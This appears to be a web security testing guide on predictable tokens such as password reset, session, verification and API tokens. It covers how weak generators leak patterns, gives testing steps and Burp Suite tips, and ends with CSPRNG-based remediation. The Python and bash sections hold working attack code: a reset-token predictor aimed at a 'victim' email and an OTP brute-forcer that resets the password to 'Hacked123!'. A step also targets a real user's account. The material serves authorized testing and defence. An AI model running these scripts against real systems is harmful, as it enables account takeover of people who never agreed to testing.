# Token Predictability

## Overview
Token predictability refers to the ability of an attacker to determine or guess valid session tokens, password reset tokens, email verification tokens, or other security-critical tokens by analyzing their structure or generation algorithm. Unlike pure entropy analysis (which measures randomness), predictability testing examines whether the token generation algorithm itself introduces biases, sequential patterns, or algorithmic weaknesses that allow an attacker to narrow the search space or directly compute valid tokens. This extends beyond session tokens to password reset links, one-time tokens, and API keys.

## How It Works
- Applications generate tokens using weak sources of randomness: `time()`, `rand()`, `Math.random()`, sequential database IDs, or combinations thereof.
- An attacker collects multiple tokens (legitimate or through controlled test accounts) and analyzes them for patterns.
- If tokens encode timestamps, user IDs, or other predictable data, the attacker can enumerate the token space.
- Some token generators use the same seed across application restarts, making all tokens predictable if the seed is known.
- MD5 or SHA1 hashes of predictable inputs (timestamp + IP + username) look random but are fully deterministic and predictable once the input format is known.
- An attacker who knows the token format can precompute all valid tokens for a target time window.

## Impact
- Prediction and brute-force of password reset tokens enabling account takeover without credentials.
- Prediction of email verification tokens to verify attacker-controlled email addresses.
- Session token prediction allowing session hijacking of active or recent sessions.
- API key prediction enabling unauthorized API access.
- Large-scale automated attacks against all users whose tokens are generated within a predictable window.

## Where to Look
- Password reset links in emails — examine the token component of the URL.
- Email verification links.
- Session token values in cookies or `Authorization: Bearer` headers.
- API keys issued to test accounts upon registration.
- One-time passwords (OTPs) and magic login links.
- "Invite user" tokens, file sharing tokens, and temporary access links.
- Source code for token generation — look for `time()`, `rand()`, `hash(md5/sha1(...))` patterns.

## Testing Steps
1. Register multiple test accounts and collect all tokens issued: session tokens, verification emails, reset links.
2. Decode each token (hex, Base64, URL encoding) and compare structure side by side.
3. Check for timestamp components: convert numeric segments to Unix timestamps and verify they align with token issuance time.
4. Check for incremental/sequential components: subtract consecutive tokens and look for constant differences.
5. Collect 30+ password reset tokens for your test account in rapid succession — analyze for patterns.
6. Identify the algorithm: if tokens are hex strings of length 32, they may be MD5 hashes of predictable input.
7. If MD5/SHA1 suspected: try `md5(timestamp)`, `md5(username + timestamp)`, `md5(email + time())` — if any produce observed tokens, the algorithm is exposed.
8. For sequential tokens: determine the step size and predict the next N tokens.
9. Attempt a token for a concurrent real user account (created at approximately the same time) using the predicted value.
10. Report with evidence: the exact pattern discovered, predicted tokens, and a proof-of-concept account takeover.

## Payloads / Techniques

```python
import hashlib, time, itertools

# Test if reset token = md5(email + timestamp)
def try_predict_reset_token(target_email, observed_token, time_window=60):
    """Try to reverse-engineer a password reset token."""
    current_time = int(time.time())
    
    for t in range(current_time - time_window, current_time + 10):
        # Try various hash inputs
        candidates = [
            f"{target_email}{t}",
            f"{t}{target_email}",
            target_email,
            str(t),
            f"{target_email}:{t}",
        ]
        for c in candidates:
            md5_hash = hashlib.md5(c.encode()).hexdigest()
            sha1_hash = hashlib.sha1(c.encode()).hexdigest()
            if md5_hash == observed_token:
                print(f"[MATCH] md5('{c}') = {observed_token}")
                return c, "md5"
            if sha1_hash == observed_token:
                print(f"[MATCH] sha1('{c}') = {observed_token}")
                return c, "sha1"
    print("[*] No match found in time window")
    return None, None

# Example usage
try_predict_reset_token("victim@target.com", "5d41402abc4b2a76b9719d911017c592")
```

```python
import base64, json

# Decode and analyze token structure
tokens = [
    "dXNlcl9pZD0xJnRzPTE3MTAwMDAwMDAmcmFuZD0xMjM0NQ==",
    "dXNlcl9pZD0yJnRzPTE3MTAwMDAwMDEmcmFuZD0xMjM0Ng==",
    "dXNlcl9pZD0zJnRzPTE3MTAwMDAwMDImcmFuZD0xMjM0Nw==",
]

print("Decoded tokens:")
for t in tokens:
    decoded = base64.b64decode(t + "==").decode()
    print(f"  {decoded}")
    # Example output: user_id=1&ts=1710000000&rand=12345
    # PREDICTABLE: sequential user_id, timestamp, sequential rand
```

```python
# Brute-force short numeric reset tokens
import requests, string

BASE = "https://target.com"

# If reset tokens are 6-digit numeric OTPs
def bruteforce_numeric_otp(email, token_len=6):
    for n in range(10**token_len):
        token = str(n).zfill(token_len)
        r = requests.post(f"{BASE}/reset-password", data={
            "email": email,
            "token": token,
            "new_password": "Hacked123!"
        })
        if r.status_code == 200 and "success" in r.text.lower():
            print(f"[!] Valid token found: {token}")
            return token
        # Add rate limit handling
    print("Brute-force complete")

# For 6-digit OTP: 1,000,000 combinations
# At 100 req/s = ~2.8 hours (realistically needs rate limit bypass)
```

```python
# Analyze entropy and patterns in collected tokens
import re, statistics
from collections import Counter

tokens = [
    "a1b2c3d4e5f6",
    "a1b2c3d4e5f7",
    "a1b2c3d4e5f8",
    "a1b2c3d4e5f9",
]

print("Pattern analysis:")
# Check common prefix/suffix
prefix_len = 0
for i in range(min(len(t) for t in tokens)):
    if len(set(t[i] for t in tokens)) == 1:
        prefix_len += 1
    else:
        break
print(f"  Common prefix length: {prefix_len} chars")
print(f"  Common prefix: {tokens[0][:prefix_len]}")
print(f"  Varying suffix: {[t[prefix_len:] for t in tokens]}")

# Check if suffix is sequential
suffixes = [t[prefix_len:] for t in tokens]
try:
    nums = [int(s, 16) for s in suffixes]
    diffs = [nums[i+1] - nums[i] for i in range(len(nums)-1)]
    if len(set(diffs)) == 1:
        print(f"  SEQUENTIAL INCREMENT: {diffs[0]}")
except ValueError:
    pass
```

```bash
# Collect reset tokens rapidly for pattern analysis
for i in $(seq 1 20); do
  RESPONSE=$(curl -s -X POST https://target.com/forgot-password \
    -d "email=testaccount@yourmail.com" \
    -H "Content-Type: application/x-www-form-urlencoded")
  echo "Request $i: $RESPONSE"
  sleep 2
done
# Check your email for the tokens and analyze them
```

## Burp Suite Tips
- **Sequencer on Reset Tokens**: If the application allows you to trigger token issuance and receive the token in a response (not just email), use Burp Sequencer to collect and analyze them statistically.
- **Intruder — Token Brute-force**: If tokens are short (4–8 alphanumeric chars), use Intruder with a brute-force payload type on the token parameter of the password reset confirmation endpoint.
- **Logger++**: Log all responses containing token-like strings (hexadecimal sequences, Base64 blobs) for offline analysis.
- **Comparer**: Collect 5–10 tokens and compare them in Burp Comparer to visually identify stable vs. varying regions.
- **Extensions — Autorize**: Not directly for token prediction, but useful to confirm that predicted tokens grant access to the targeted account.

## Tools
- **Burp Suite Sequencer** — statistical randomness analysis of token feeds.
- **hashcat** — reverse-engineer hashed tokens if you suspect MD5/SHA1 of predictable inputs.
- **CyberChef** — decode tokens, try various hash functions, identify encoding formats.
- **Python scripts** — custom token analysis, pattern detection, and prediction.
- **jwt_tool** — JWT-specific token analysis including algorithm confusion and claims manipulation.
- **Turbo Intruder (Burp extension)** — high-speed fuzzing for brute-forcing short token spaces.
- **token-predict** tools (custom/GitHub) — specialized scripts for common web framework token prediction.

## Remediation
- Use a CSPRNG for all security-critical tokens: `secrets.token_urlsafe(32)` (Python), `crypto.randomBytes(32)` (Node.js), `SecureRandom` (Java).
- Tokens should have at least 128 bits of entropy — use 256 bits for long-lived tokens like password reset links.
- Never use: `time()`, `rand()`, `Math.random()`, sequential IDs, user IDs, email addresses, or any predictable data as token inputs.
- Never use MD5/SHA1 of predictable inputs as tokens — even with a secret salt, use HMAC with a strong key.
- Set short expiry on all one-time tokens: password reset tokens should expire in 15–60 minutes.
- Invalidate reset/verification tokens after single use.
- Implement rate limiting on token submission endpoints to prevent brute-force.
- Log and alert on high volumes of token validation failures (brute-force detection).
- Rotate API keys periodically and on any suspected compromise.

## References
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Sessionid_in_Browser_History
https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/340.html
https://cwe.mitre.org/data/definitions/330.html
https://portswigger.net/web-security/authentication/other-mechanisms#password-reset-poisoning
https://owasp.org/www-community/vulnerabilities/Weak_Random_Number_Generator
